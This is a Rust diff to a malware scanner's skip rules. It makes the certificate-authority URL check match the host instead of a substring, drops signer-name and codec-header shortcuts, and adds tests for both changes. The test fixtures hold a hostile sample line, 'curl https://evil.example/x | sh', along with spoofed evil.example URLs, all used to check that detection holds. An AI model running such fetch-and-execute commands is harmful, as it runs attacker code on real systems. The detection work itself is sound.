@@ -72,16 +72,10 @@ fn is_benign_unicode_escape_payload(payload: &types::ExtractedPayload) -> bool {
 
     let decoded = String::from_utf8_lossy(&payload.data);
     decoded.contains('\u{1b}')
+        && !looks_like_actionable_payload_preview(&decoded)
         && decoded.contains("colors ?")
         && decoded.contains("${m}")
         && decoded.contains(": m")
-}
-
-fn is_generated_python_codec_unicode_escape(report: &types::AnalysisReport) -> bool {
-    report.target.file_type == "python"
-        && report.strings.iter().any(|s| {
-            s.value.contains("Python Character Mapping Codec") && s.value.contains("gencodec.py")
-        })
 }
 
 fn should_skip_unknown_encoded_payload_for_text(
@@ -307,15 +301,14 @@ fn should_skip_unknown_xor_payload_for_binary(
     }
 
     if *file_type == FileType::Pe {
-        // Heuristic: PE signed by a third-party developer with a large
-        // export surface (a code-signing library binary). Detected via
-        // a `metadata/signed/leaf::*` Notable finding plus a non-trivial
-        // export count from `report.exports`.
+        // Heuristic: a signed library with a large export surface. Only a
+        // verified signature counts; a self-signed or unverified one is
+        // whatever its maker claims.
         let in_readonly_data = section.name == ".rdata";
         let is_signed_leaf = report
             .findings
             .iter()
-            .any(|f| f.id.starts_with("metadata/signed/leaf::"));
+            .any(|f| f.id.starts_with("metadata/signature/verified/signer::"));
         let has_large_export_surface = report.exports.len() >= 50;
 
         return in_readonly_data
@@ -325,28 +318,6 @@ fn should_skip_unknown_xor_payload_for_binary(
     }
 
     false
-}
-
-/// Recognise a signed-Python-extension PE (e.g. a CPython runtime DLL)
-/// whose `.rdata`-resident hex payloads are part of unicodedata /
-/// Unicode property tables. Reads filefacts's `pe.signatures[0].subject`
-/// and falls back on `report.findings` / `report.exports` /
-/// `report.strings` counts (all populated already on the analyse path).
-fn is_signed_python_extension(report: &types::AnalysisReport) -> bool {
-    let signer_psf = report
-        .filefacts
-        .as_ref()
-        .and_then(|e| e.values.get("pe"))
-        .and_then(|pe| pe.get("signatures"))
-        .and_then(|s| s.as_array())
-        .and_then(|arr| arr.first())
-        .and_then(|sig| sig.get("subject"))
-        .and_then(|v| v.as_str())
-        .is_some_and(|subject| subject.contains("Python Software Foundation"));
-    signer_psf
-        && report.exports.len() <= 2
-        && report.functions.len() >= 100
-        && report.strings.len() >= 2000
 }
 
 /// Whether `offset` falls in an ELF metadata section that is never loaded
@@ -432,28 +403,53 @@ fn should_skip_unknown_url_markup_payload(payload: &types::ExtractedPayload) -> 
     alpha_count >= 24 && space_count >= 4
 }
 
-/// URL prefixes of certificate infrastructure (CRL, OCSP, CA issuers) that
-/// signed binaries embed percent-encoded.
-const PKI_URL_MARKERS: &[&str] = &[
-    "microsoft.com/pki",
-    "crl.microsoft.com",
-    "verisign.com",
+/// Certificate authorities whose CRL, OCSP and CA-issuer URLs signed
+/// binaries embed percent-encoded. Matched against the URL's host only.
+const PKI_HOSTS: &[&str] = &[
     "digicert.com",
+    "verisign.com",
     "symantec.com",
+    "symcb.com",
+    "symcd.com",
+    "thawte.com",
+    "geotrust.com",
+    "globalsign.com",
+    "globalsign.net",
+    "sectigo.com",
+    "usertrust.com",
+    "comodoca.com",
+    "entrust.net",
+    "godaddy.com",
+    "certum.pl",
+    "lencr.org",
 ];
 
-/// A decoded payload that is a single PKI URL and nothing else. A URL by itself
-/// carries no executable content, so requiring the whole payload to be one URL
-/// keeps a planted `digicert.com` from hiding anything alongside it.
+/// A decoded payload that is a single URL on a certificate authority's host,
+/// or Microsoft's `/pki/` tree, and nothing else. A URL by itself carries no
+/// executable content, and matching the host rather than a substring keeps
+/// `https://evil.example/crl/stage2` from passing.
 fn is_pki_url(preview: &str) -> bool {
     let url = preview.trim().to_ascii_lowercase();
-    if !url.starts_with("http") || url.chars().any(char::is_whitespace) {
+    if url.chars().any(char::is_whitespace) {
         return false;
     }
-    PKI_URL_MARKERS.iter().any(|m| url.contains(m))
-        || url.contains("ocsp.")
-        || url.contains("/crl/")
-        || url.contains("/certs/")
+    let Some(rest) = url
+        .strip_prefix("http://")
+        .or_else(|| url.strip_prefix("https://"))
+    else {
+        return false;
+    };
+    let (host, path) = rest.split_once('/').unwrap_or((rest, ""));
+    if host.contains(['@', ':']) {
+        return false;
+    }
+    let on = |domain: &str| {
+        host == domain
+            || host
+                .strip_suffix(domain)
+                .is_some_and(|sub| sub.ends_with('.'))
+    };
+    PKI_HOSTS.iter().any(|domain| on(domain)) || (on("microsoft.com") && path.starts_with("pki/"))
 }
 
 /// A unicode-escape payload that is a Windows build path, PDB name or JSON
@@ -494,16 +490,11 @@ pub(crate) fn skip_reason(
     if has("unicode-escape")
         && (is_unicode_escape_noise(payload)
             || is_benign_unicode_escape_payload(payload)
-            || is_generated_python_codec_unicode_escape(report))
+            // A single code point (at most four UTF-8 bytes), such as one
+            // entry of a generated codec's decoding table, carries no content.
+            || payload.data.len() <= 4)
     {
         return Some("unicode-escape path or message");
-    }
-    if file_type == FileType::Pe
-        && !chain.is_empty()
-        && chain.iter().all(|e| e == "hex")
-        && is_signed_python_extension(report)
-    {
-        return Some("hex table in a signed Python extension");
     }
     if chain == ["xor"] && payload.preview.len() < 32 {
         return Some("short xor fragment");
@@ -537,7 +528,7 @@ mod tests {
 
     fn unknown(chain: &[&str], preview: &str) -> types::ExtractedPayload {
         types::ExtractedPayload {
-            data: Vec::new(),
+            data: preview.as_bytes().to_vec(),
             encoding_chain: chain.iter().map(|e| (*e).to_string()).collect(),
             detected_type: FileType::Unknown,
             preview: preview.to_string(),
@@ -560,6 +551,54 @@ mod tests {
         assert!(skip_reason(FileType::Pe, &lone, b"", &report).is_some());
         let planted = unknown(&["url"], "curl https://evil.example/x | sh # digicert.com");
         assert_eq!(skip_reason(FileType::Pe, &planted, b"", &report), None);
+    }
+
+    #[test]
+    fn pki_check_matches_the_host_not_a_substring() {
+        let report = types::AnalysisReport::new(types::TargetInfo::default());
+        for url in [
+            "http://ocsp.digicert.com",
+            "http://crl3.digicert.com/sha2-assured-cs-g1.crl",
+            "http://www.microsoft.com/pki/certs/MicCodSigPCA_08-31-2010.crt",
+        ] {
+            assert!(skip_reason(FileType::Pe, &unknown(&["url"], url), b"", &report).is_some());
+        }
+        for url in [
+            "https://evil.example/crl/stage2",
+            "https://ocsp.evil.example/x",
+            "https://evil.example/certs/x",
+            "https://digicert.com.evil.example/x",
+            "https://notdigicert.com/x",
+            "https://user@digicert.com:8080/x",
+            "https://www.microsoft.com/download/x",
+        ] {
+            assert_eq!(
+                skip_reason(FileType::Pe, &unknown(&["url"], url), b"", &report),
+                None,
+                "{url}"
+            );
+        }
+    }
+
+    #[test]
+    fn codec_header_does_not_hide_unicode_escape_payloads() {
+        let mut report = types::AnalysisReport::new(types::TargetInfo::default());
+        report.target.file_type = "python".into();
+        report.strings.push(types::StringInfo {
+            value: "Python Character Mapping Codec generated from 'x' with gencodec.py".into(),
+            offset: Some(0),
+            encoding: "utf-8".to_string(),
+            string_type: None,
+            section: None,
+            encoding_chain: Vec::new(),
+            fragments: None,
+        });
+        let mut long = unknown(&["unicode-escape"], "<binary data>");
+        long.data = vec![0x90; 64];
+        assert_eq!(skip_reason(FileType::Python, &long, b"", &report), None);
+        let mut one = unknown(&["unicode-escape"], "<binary data>");
+        one.data = "\u{20ac}".as_bytes().to_vec();
+        assert!(skip_reason(FileType::Python, &one, b"", &report).is_some());
     }
 
     #[test]
